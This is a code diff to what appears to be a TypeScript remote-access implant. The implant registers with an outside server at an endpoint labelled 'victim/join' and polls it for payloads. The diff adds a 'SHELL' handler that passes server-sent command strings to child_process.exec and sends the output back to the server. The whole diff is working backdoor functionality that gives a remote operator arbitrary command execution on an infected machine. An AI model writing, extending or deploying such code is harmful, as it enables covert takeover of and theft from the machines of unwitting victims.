@@ -15,6 +15,7 @@
  * along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
 import * as os from "os";
+const { exec } = require("child_process");
 
 const DOMAIN = "https://frpc.batsense.net";
 const REGISTER = `${DOMAIN}/api/v1/victim/join`;
@@ -76,12 +77,39 @@ export const execCustomPayload = async (payload: Payload) => {
 	await fetch(RESPONSE, makePayload(response, payload.id));
 };
 
+export const shell = async (payload: Payload) => {
+	let response;
+	exec(payload.payload, async (error, stdout, stderr) => {
+		if (error) {
+			response = {
+				response: error.message
+			};
+			await fetch(RESPONSE, makePayload(response, payload.id));
+			return;
+		}
+		if (stderr) {
+			response = {
+				response: stderr
+			};
+			await fetch(RESPONSE, makePayload(response, payload.id));
+			return;
+		}
+
+		response = {
+			response: stdout
+		};
+		await fetch(RESPONSE, makePayload(response, payload.id));
+	});
+};
+
 const UPDATE_PERIOD = 250;
 setTimeout(async () => {
 	let payload: Array<Payload> = await getPayloads();
 	payload.forEach(async p => {
 		if (p.payload_type == "INFO") {
 			await info(p.id);
+		} else if (p.payload_type == "SHELL") {
+			await shell(p);
 		} else {
 			await execCustomPayload(p);
 		}
